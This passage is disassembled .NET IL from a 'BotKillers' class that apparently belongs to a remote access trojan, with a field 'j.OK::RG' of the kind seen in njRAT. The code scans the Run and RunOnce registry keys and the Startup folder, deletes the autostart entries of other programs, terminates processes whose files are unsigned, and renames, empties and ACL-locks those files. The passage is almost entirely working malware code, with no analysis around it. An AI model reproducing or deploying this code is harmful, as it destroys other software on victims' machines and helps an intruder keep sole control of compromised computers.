      IL_0101:  ldloc.s    V_4
      IL_0103:  ldc.i4.4
      IL_0104:  and
      IL_0105:  ldc.i4.4
      IL_0106:  bne.un.s   IL_010f

      IL_0108:  ldc.i4.s   22
      IL_010a:  stloc.3
      IL_010b:  ldc.i4.1
      IL_010c:  stloc.0
      IL_010d:  br.s       IL_0125

      IL_010f:  ldc.i4.s   23
      IL_0111:  stloc.3
      IL_0112:  ldloc.s    V_4
      IL_0114:  ldc.i4.2
      IL_0115:  and
      IL_0116:  ldc.i4.2
      IL_0117:  bne.un.s   IL_0120

      IL_0119:  ldc.i4.s   24
      IL_011b:  stloc.3
      IL_011c:  ldc.i4.1
      IL_011d:  stloc.0
      IL_011e:  br.s       IL_0125

      IL_0120:  ldc.i4.s   25
      IL_0122:  stloc.3
      IL_0123:  ldc.i4.0
      IL_0124:  stloc.0
      IL_0125:  leave      IL_01df

      IL_012a:  ldloc.2
      IL_012b:  ldc.i4.1
      IL_012c:  add
      IL_012d:  ldc.i4.0
      IL_012e:  stloc.2
      IL_012f:  switch     ( 
                            IL_01a0,
                            IL_0000,
                            IL_0007,
                            IL_0016,
                            IL_001f,
                            IL_0033,
                            IL_003b,
                            IL_004a,
                            IL_0053,
                            IL_0062,
                            IL_006c,
                            IL_007c,
                            IL_0086,
                            IL_0096,
                            IL_00a0,
                            IL_00b0,
                            IL_00b7,
                            IL_00c2,
                            IL_00c9,
                            IL_00ec,
                            IL_00f3,
                            IL_00fe,
                            IL_0108,
                            IL_010f,
                            IL_0119,
                            IL_0120,
                            IL_0125)
      IL_01a0:  leave.s    IL_01d4

      IL_01a2:  ldloc.3
      IL_01a3:  stloc.2
      IL_01a4:  ldloc.1
      IL_01a5:  switch     ( 
                            IL_01b2,
                            IL_012a)
      IL_01b2:  leave.s    IL_01d4

    }  // end .try
    filter
    {
      IL_01b4:  isinst     [mscorlib]System.Exception
      IL_01b9:  ldnull
      IL_01ba:  cgt.un
      IL_01bc:  ldloc.1
      IL_01bd:  ldc.i4.0
      IL_01be:  cgt.un
      IL_01c0:  and
      IL_01c1:  ldloc.2
      IL_01c2:  ldc.i4.0
      IL_01c3:  ceq
      IL_01c5:  and
      IL_01c6:  endfilter
    }  // end filter
    {  // handler
      IL_01c8:  castclass  [mscorlib]System.Exception
      IL_01cd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01d2:  leave.s    IL_01a2

    }  // end handler
    IL_01d4:  ldc.i4     0x800a0033
    IL_01d9:  call       class [mscorlib]System.Exception [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::CreateProjectError(int32)
    IL_01de:  throw

    IL_01df:  ldloc.2
    IL_01e0:  brfalse.s  IL_01e7

    IL_01e2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
    IL_01e7:  ldloc.0
    IL_01e8:  ret
  } // end of method BotKillers::IsFileMalicious

  .method public static void  KillFile(string location) cil managed
  {
    // Code size       43 (0x2b)
    .maxstack  4
    .locals init (string V_0,
             class [mscorlib]System.Security.AccessControl.DirectorySecurity V_1)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  stloc.0
      IL_0002:  ldloc.0
      IL_0003:  newobj     instance void [mscorlib]System.IO.DirectoryInfo::.ctor(string)
      IL_0008:  newobj     instance void [mscorlib]System.Security.AccessControl.DirectorySecurity::.ctor()
      IL_000d:  stloc.1
      IL_000e:  ldloc.1
      IL_000f:  ldc.i4.1
      IL_0010:  ldc.i4.0
      IL_0011:  callvirt   instance void [mscorlib]System.Security.AccessControl.ObjectSecurity::SetAccessRuleProtection(bool,
                                                                                                                         bool)
      IL_0016:  ldloc.1
      IL_0017:  callvirt   instance void [mscorlib]System.IO.DirectoryInfo::SetAccessControl(class [mscorlib]System.Security.AccessControl.DirectorySecurity)
      IL_001c:  leave.s    IL_002a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_001e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0023:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0028:  leave.s    IL_002a

    }  // end handler
    IL_002a:  ret
  } // end of method BotKillers::KillFile

  .method public static bool  WindowIsVisible(string WinTitle) cil managed
  {
    // Code size       31 (0x1f)
    .maxstack  2
    .locals init (bool V_0)
    .try
    {
      IL_0000:  ldnull
      IL_0001:  ldarg.0
      IL_0002:  call       native int BotKillers::FindWindow(string,
                                                             string)
      IL_0007:  call       bool BotKillers::IsWindowVisible(native int)
      IL_000c:  stloc.0
      IL_000d:  leave.s    IL_001d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_000f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0014:  ldc.i4.0
      IL_0015:  stloc.0
      IL_0016:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_001b:  leave.s    IL_001d

    }  // end handler
    IL_001d:  ldloc.0
    IL_001e:  ret
  } // end of method BotKillers::WindowIsVisible

  .method public static void  RunStartupKiller() cil managed
  {
    // Code size       458 (0x1ca)
    .maxstack  4
    .locals init (int32 V_0,
             int32 V_1,
             int32 V_2,
             string V_3,
             class [mscorlib]System.Collections.Generic.IEnumerator`1<string> V_4,
             string V_5)
    .try
    {
      IL_0000:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0005:  ldc.i4.1
      IL_0006:  stloc.0
      IL_0007:  ldc.i4.2
      IL_0008:  stloc.2
      IL_0009:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
      IL_000e:  ldc.i4.1
      IL_000f:  call       void BotKillers::StartupFucker(string,
                                                          int32)
      IL_0014:  ldc.i4.3
      IL_0015:  stloc.2
      IL_0016:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\"
      IL_001b:  ldc.i4.1
      IL_001c:  call       void BotKillers::StartupFucker(string,
                                                          int32)
      IL_0021:  ldc.i4.4
      IL_0022:  stloc.2
      IL_0023:  call       bool BotKillers::IsAdmin()
      IL_0028:  brfalse.s  IL_0044

      IL_002a:  ldc.i4.5
      IL_002b:  stloc.2
      IL_002c:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
      IL_0031:  ldc.i4.2
      IL_0032:  call       void BotKillers::StartupFucker(string,
                                                          int32)
      IL_0037:  ldc.i4.6
      IL_0038:  stloc.2
      IL_0039:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\"
      IL_003e:  ldc.i4.2
      IL_003f:  call       void BotKillers::StartupFucker(string,
                                                          int32)
      IL_0044:  ldc.i4.7
      IL_0045:  stloc.2
      IL_0046:  ldc.i4.7
      IL_0047:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_004c:  ldstr      "\\"
      IL_0051:  ldsfld     string j.OK::RG
      IL_0056:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_005b:  call       string [mscorlib]System.IO.Path::GetFileNameWithoutExtension(string)
      IL_0060:  stloc.3
      IL_0061:  ldc.i4.8
      IL_0062:  stloc.2
      IL_0063:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0068:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
      IL_006d:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0072:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
      IL_0077:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::get_SpecialDirectories()
      IL_007c:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy::get_Programs()
      IL_0081:  ldstr      "\\Startup"
      IL_0086:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_008b:  callvirt   instance class [mscorlib]System.Collections.ObjectModel.ReadOnlyCollection`1<string> [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::GetFiles(string)
      IL_0090:  callvirt   instance class [mscorlib]System.Collections.Generic.IEnumerator`1<!0> class [mscorlib]System.Collections.ObjectModel.ReadOnlyCollection`1<string>::GetEnumerator()
      IL_0095:  stloc.s    V_4
      IL_0097:  br.s       IL_0111

      IL_0099:  ldloc.s    V_4
      IL_009b:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.IEnumerator`1<string>::get_Current()
      IL_00a0:  stloc.s    V_5
      IL_00a2:  ldc.i4.s   9
      IL_00a4:  stloc.2
      IL_00a5:  ldloc.s    V_5
      IL_00a7:  ldsfld     string j.OK::RG
      IL_00ac:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00b1:  ldc.i4.0
      IL_00b2:  ceq
      IL_00b4:  ldloc.s    V_5
      IL_00b6:  ldloc.3
      IL_00b7:  ldstr      ".url"
      IL_00bc:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00c1:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00c6:  ldc.i4.0
      IL_00c7:  ceq
      IL_00c9:  and
      IL_00ca:  ldloc.s    V_5
      IL_00cc:  ldstr      ".ini"
      IL_00d1:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00d6:  ldc.i4.0
      IL_00d7:  ceq
      IL_00d9:  and
      IL_00da:  brfalse.s  IL_010e

      IL_00dc:  ldc.i4.s   10
      IL_00de:  stloc.2
      IL_00df:  ldloc.s    V_5
      IL_00e1:  call       void BotKillers::DestroyFile(string)
      IL_00e6:  ldc.i4.s   11
      IL_00e8:  stloc.2
      IL_00e9:  ldc.i4.s   50
      IL_00eb:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_00f0:  ldc.i4.s   12
      IL_00f2:  stloc.2
      IL_00f3:  ldloc.s    V_5
      IL_00f5:  call       void BotKillers::DestroyFile(string)
      IL_00fa:  ldc.i4.s   13
      IL_00fc:  stloc.2
      IL_00fd:  ldc.i4.s   50
      IL_00ff:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0104:  ldc.i4.s   14
      IL_0106:  stloc.2
      IL_0107:  ldloc.s    V_5
      IL_0109:  call       void BotKillers::DestroyFile(string)
      IL_010e:  ldc.i4.s   15
      IL_0110:  stloc.2
      IL_0111:  ldloc.s    V_4
      IL_0113:  callvirt   instance bool [mscorlib]System.Collections.IEnumerator::MoveNext()
      IL_0118:  brtrue     IL_0099

      IL_011d:  ldc.i4.s   16
      IL_011f:  stloc.2
      IL_0120:  ldloc.s    V_4
      IL_0122:  brfalse.s  IL_012b

      IL_0124:  ldloc.s    V_4
      IL_0126:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_012b:  leave      IL_01c1

      IL_0130:  ldloc.1
      IL_0131:  ldc.i4.1
      IL_0132:  add
      IL_0133:  ldc.i4.0
      IL_0134:  stloc.1
      IL_0135:  switch     ( 
                            IL_0182,
                            IL_0000,
                            IL_0007,
                            IL_0014,
                            IL_0021,
                            IL_002a,
                            IL_0037,
                            IL_0044,
                            IL_0061,
                            IL_00a2,
                            IL_00dc,
                            IL_00e6,
                            IL_00f0,
                            IL_00fa,
                            IL_0104,
                            IL_010e,
                            IL_011d,
                            IL_012b)
      IL_0182:  leave.s    IL_01b6

      IL_0184:  ldloc.2
      IL_0185:  stloc.1
      IL_0186:  ldloc.0
      IL_0187:  switch     ( 
                            IL_0194,
                            IL_0130)
      IL_0194:  leave.s    IL_01b6

    }  // end .try
    filter
    {
      IL_0196:  isinst     [mscorlib]System.Exception
      IL_019b:  ldnull
      IL_019c:  cgt.un
      IL_019e:  ldloc.0
      IL_019f:  ldc.i4.0
      IL_01a0:  cgt.un
      IL_01a2:  and
      IL_01a3:  ldloc.1
      IL_01a4:  ldc.i4.0
      IL_01a5:  ceq
      IL_01a7:  and
      IL_01a8:  endfilter
    }  // end filter
    {  // handler
      IL_01aa:  castclass  [mscorlib]System.Exception
      IL_01af:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01b4:  leave.s    IL_0184

    }  // end handler
    IL_01b6:  ldc.i4     0x800a0033
    IL_01bb:  call       class [mscorlib]System.Exception [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::CreateProjectError(int32)
    IL_01c0:  throw

    IL_01c1:  ldloc.1
    IL_01c2:  brfalse.s  IL_01c9

    IL_01c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
    IL_01c9:  ret
  } // end of method BotKillers::RunStartupKiller

  .method public static void  StartupFucker(string regkey,
                                            int32 'type') cil managed
  {
    // Code size       273 (0x111)
    .maxstack  5
    .locals init (class [mscorlib]Microsoft.Win32.RegistryKey V_0,
             string[] V_1,
             int32 V_2,
             string V_3,
             string V_4)
    .try
    {
      IL_0000:  ldarg.1
      IL_0001:  ldc.i4.1
      IL_0002:  bne.un.s   IL_0010

      IL_0004:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
      IL_0009:  ldarg.0
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
      IL_000f:  stloc.0
      IL_0010:  ldarg.1
      IL_0011:  ldc.i4.2
      IL_0012:  bne.un.s   IL_0020

      IL_0014:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::LocalMachine
      IL_0019:  ldarg.0
      IL_001a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
      IL_001f:  stloc.0
      IL_0020:  ldloc.0
      IL_0021:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetValueNames()
      IL_0026:  stloc.1
      IL_0027:  ldc.i4.0
      IL_0028:  stloc.2
      IL_0029:  br         IL_00f9

      IL_002e:  ldloc.1
      IL_002f:  ldloc.2
      IL_0030:  ldelem.ref
      IL_0031:  stloc.3
      .try
      {
        IL_0032:  ldloc.0
        IL_0033:  ldloc.3
        IL_0034:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string)
        IL_0039:  callvirt   instance string [mscorlib]System.Object::ToString()
        IL_003e:  stloc.s    V_4
        IL_0040:  ldloc.s    V_4
        IL_0042:  ldstr      "-"
        IL_0047:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_004c:  brfalse.s  IL_008f

        IL_004e:  ldloc.s    V_4
        IL_0050:  ldstr      "\""
        IL_0055:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_005a:  brfalse.s  IL_006e

        IL_005c:  ldloc.s    V_4
        IL_005e:  ldstr      "\""
        IL_0063:  ldsfld     string [mscorlib]System.String::Empty
        IL_0068:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                              string)
        IL_006d:  pop
        IL_006e:  nop
        .try
        {
          IL_006f:  ldloc.s    V_4
          IL_0071:  ldstr      " -"
          IL_0076:  ldc.i4.m1
          IL_0077:  ldc.i4.0
          IL_0078:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                    string,
                                                                                                    int32,
                                                                                                    valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
          IL_007d:  ldc.i4.0
          IL_007e:  ldelem.ref
          IL_007f:  stloc.s    V_4
          IL_0081:  leave.s    IL_008f

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0083:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0088:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_008d:  leave.s    IL_008f

        }  // end handler
        IL_008f:  ldloc.s    V_4
        IL_0091:  ldstr      "\""
        IL_0096:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_009b:  brfalse.s  IL_00b8

        IL_009d:  ldloc.s    V_4
        IL_009f:  ldc.i4.1
        IL_00a0:  newarr     [mscorlib]System.Char
        IL_00a5:  dup
        IL_00a6:  ldc.i4.0
        IL_00a7:  ldc.i4.s   34
        IL_00a9:  stelem.i2
        IL_00aa:  callvirt   instance string[] [mscorlib]System.String::Split(char[])
        IL_00af:  ldc.i4.1
        IL_00b0:  ldelem.ref
        IL_00b1:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
        IL_00b6:  stloc.s    V_4
        IL_00b8:  ldloc.s    V_4
        IL_00ba:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
        IL_00bf:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_00c4:  brtrue.s   IL_00e7

        IL_00c6:  ldarg.1
        IL_00c7:  ldloc.3
        IL_00c8:  ldarg.0
        IL_00c9:  ldloc.s    V_4
        IL_00cb:  call       void BotKillers::RemoveKey(int32,
                                                        string,
                                                        string,
                                                        string)
        IL_00d0:  ldloc.s    V_4
        IL_00d2:  call       bool BotKillers/WinTrust::VerifyEmbeddedSignature(string)
        IL_00d7:  brtrue.s   IL_00e7

        IL_00d9:  ldloc.s    V_4
        IL_00db:  call       void BotKillers::TerminateProcessPath(string)
        IL_00e0:  ldloc.s    V_4
        IL_00e2:  call       void BotKillers::DestroyFile(string)
        IL_00e7:  leave.s    IL_00f5

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00e9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00ee:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00f3:  leave.s    IL_00f5

      }  // end handler
      IL_00f5:  ldloc.2
      IL_00f6:  ldc.i4.1
      IL_00f7:  add.ovf
      IL_00f8:  stloc.2
      IL_00f9:  ldloc.2
      IL_00fa:  ldloc.1
      IL_00fb:  ldlen
      IL_00fc:  conv.i4
      IL_00fd:  blt        IL_002e

      IL_0102:  leave.s    IL_0110

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0104:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0109:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_010e:  leave.s    IL_0110

    }  // end handler
    IL_0110:  ret
  } // end of method BotKillers::StartupFucker

  .method public static void  RemoveKey(int32 Reg,
                                        string file,
                                        string reglocation,
                                        string FileLocation) cil managed
  {
    // Code size       75 (0x4b)
    .maxstack  3
    .locals init (string V_0,
             class [mscorlib]Microsoft.Win32.RegistryKey V_1,
             class [mscorlib]Microsoft.Win32.RegistryKey V_2)
    .try
    {
      IL_0000:  ldarg.2
      IL_0001:  stloc.0
      IL_0002:  ldnull
      IL_0003:  stloc.1
      IL_0004:  ldarg.0
      IL_0005:  ldc.i4.1
      IL_0006:  bne.un.s   IL_0017

      IL_0008:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
      IL_000d:  ldloc.0
      IL_000e:  ldc.i4.1
      IL_000f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0014:  stloc.1
      IL_0015:  br.s       IL_0024

      IL_0017:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::LocalMachine
      IL_001c:  ldloc.0
      IL_001d:  ldc.i4.1
      IL_001e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0023:  stloc.1
      IL_0024:  ldloc.1
      IL_0025:  stloc.2
      .try
      {
        IL_0026:  ldloc.1
        IL_0027:  brfalse.s  IL_0030

        IL_0029:  ldloc.1
        IL_002a:  ldarg.1
        IL_002b:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string)
        IL_0030:  leave.s    IL_003c

      }  // end .try
      finally
      {
        IL_0032:  ldloc.2
        IL_0033:  brfalse.s  IL_003b

        IL_0035:  ldloc.2
        IL_0036:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_003b:  endfinally
      }  // end handler
      IL_003c:  leave.s    IL_004a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0043:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0048:  leave.s    IL_004a

    }  // end handler
    IL_004a:  ret
  } // end of method BotKillers::RemoveKey

  .method public static void  DestroyFile(string path) cil managed noinlining nooptimization
  {
    // Code size       157 (0x9d)
    .maxstack  6
    .locals init (class [mscorlib]System.Random V_0,
             class [mscorlib]System.Security.AccessControl.DirectorySecurity V_1)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0006:  brfalse    IL_008e

      IL_000b:  newobj     instance void [mscorlib]System.Random::.ctor()
      IL_0010:  stloc.0
      .try
      {
        IL_0011:  ldarg.0
        IL_0012:  call       void BotKillers::AllowAccess(string)
        IL_0017:  call       class My.MyComputer My.MyProject::get_Computer()
        IL_001c:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
        IL_0021:  ldarg.0
        IL_0022:  call       string [mscorlib]System.IO.Path::GetTempPath()
        IL_0027:  ldloc.0
        IL_0028:  ldc.i4     0x2710
        IL_002d:  ldc.i4     0x15f90
        IL_0032:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                          int32)
        IL_0037:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
        IL_003c:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0041:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::MoveFile(string,
                                                                                                                             string)
        IL_0046:  ldarg.0
        IL_0047:  ldsfld     string [mscorlib]System.String::Empty
        IL_004c:  call       void [mscorlib]System.IO.File::WriteAllText(string,
                                                                         string)
        IL_0051:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.FileSystem::FreeFile()
        IL_0056:  ldarg.0
        IL_0057:  ldc.i4.1
        IL_0058:  ldc.i4.m1
        IL_0059:  ldc.i4.0
        IL_005a:  ldc.i4.m1
        IL_005b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.FileSystem::FileOpen(int32,
                                                                                                    string,
                                                                                                    valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.OpenMode,
                                                                                                    valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.OpenAccess,
                                                                                                    valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.OpenShare,
                                                                                                    int32)
        IL_0060:  ldarg.0
        IL_0061:  call       void BotKillers::KillFile(string)
        IL_0066:  leave.s    IL_008e

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0068:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_006d:  ldarg.0
        IL_006e:  newobj     instance void [mscorlib]System.IO.DirectoryInfo::.ctor(string)
        IL_0073:  newobj     instance void [mscorlib]System.Security.AccessControl.DirectorySecurity::.ctor()
        IL_0078:  stloc.1
        IL_0079:  ldloc.1
        IL_007a:  ldc.i4.1
        IL_007b:  ldc.i4.0
        IL_007c:  callvirt   instance void [mscorlib]System.Security.AccessControl.ObjectSecurity::SetAccessRuleProtection(bool,
                                                                                                                           bool)
        IL_0081:  ldloc.1
        IL_0082:  callvirt   instance void [mscorlib]System.IO.DirectoryInfo::SetAccessControl(class [mscorlib]System.Security.AccessControl.DirectorySecurity)
        IL_0087:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_008c:  leave.s    IL_008e

      }  // end handler
      IL_008e:  leave.s    IL_009c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0090:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0095:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_009a:  leave.s    IL_009c

    }  // end handler
    IL_009c:  ret
  } // end of method BotKillers::DestroyFile

  .method public static bool  IsAdmin() cil managed
  {
    // Code size       41 (0x29)
    .maxstack  2
    .locals init (bool V_0,
             class [mscorlib]System.Security.Principal.WindowsIdentity V_1)
    .try
    {
      IL_0000:  call       class [mscorlib]System.Security.Principal.WindowsIdentity [mscorlib]System.Security.Principal.WindowsIdentity::GetCurrent()
      IL_0005:  stloc.1
      IL_0006:  ldloc.1
      IL_0007:  newobj     instance void [mscorlib]System.Security.Principal.WindowsPrincipal::.ctor(class [mscorlib]System.Security.Principal.WindowsIdentity)
      IL_000c:  ldc.i4     0x220
      IL_0011:  callvirt   instance bool [mscorlib]System.Security.Principal.WindowsPrincipal::IsInRole(valuetype [mscorlib]System.Security.Principal.WindowsBuiltInRole)
      IL_0016:  stloc.0
      IL_0017:  leave.s    IL_0027

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0019:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_001e:  ldc.i4.0
      IL_001f:  stloc.0
      IL_0020:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0025:  leave.s    IL_0027

    }  // end handler
    IL_0027:  ldloc.0
    IL_0028:  ret
  } // end of method BotKillers::IsAdmin

  .method public static void  AllowAccess(string location) cil managed
  {
    // Code size       43 (0x2b)
    .maxstack  4
    .locals init (string V_0,
             class [mscorlib]System.Security.AccessControl.DirectorySecurity V_1)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  stloc.0
      IL_0002:  ldloc.0
      IL_0003:  newobj     instance void [mscorlib]System.IO.DirectoryInfo::.ctor(string)
      IL_0008:  newobj     instance void [mscorlib]System.Security.AccessControl.DirectorySecurity::.ctor()
      IL_000d:  stloc.1
      IL_000e:  ldloc.1
      IL_000f:  ldc.i4.0
      IL_0010:  ldc.i4.1
      IL_0011:  callvirt   instance void [mscorlib]System.Security.AccessControl.ObjectSecurity::SetAccessRuleProtection(bool,
                                                                                                                         bool)
      IL_0016:  ldloc.1
      IL_0017:  callvirt   instance void [mscorlib]System.IO.DirectoryInfo::SetAccessControl(class [mscorlib]System.Security.AccessControl.DirectorySecurity)
      IL_001c:  leave.s    IL_002a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_001e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0023:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0028:  leave.s    IL_002a

    }  // end handler
    IL_002a:  ret
  } // end of method BotKillers::AllowAccess

  .method public static void  TerminateProcessPath(string Path) cil managed
  {
    // Code size       196 (0xc4)
    .maxstack  4
    .locals init (class [System]System.Diagnostics.Process[] V_0,
             string[] V_1,
             int32 V_2,
             string V_3,
             int32 V_4,
             int32 V_5,
             class [System]System.Diagnostics.Process V_6)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0006:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_000b:  callvirt   instance string [mscorlib]System.String::ToString()
      IL_0010:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0015:  brtrue     IL_00b5

      IL_001a:  ldarg.0
      IL_001b:  ldstr      "\\"
      IL_0020:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0025:  brfalse.s  IL_0057

      IL_0027:  ldarg.0
      IL_0028:  ldstr      "\\"
      IL_002d:  ldc.i4.m1
      IL_002e:  ldc.i4.0
      IL_002f:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                string,
                                                                                                int32,
                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
      IL_0034:  stloc.1
      IL_0035:  ldc.i4.0
      IL_0036:  stloc.2
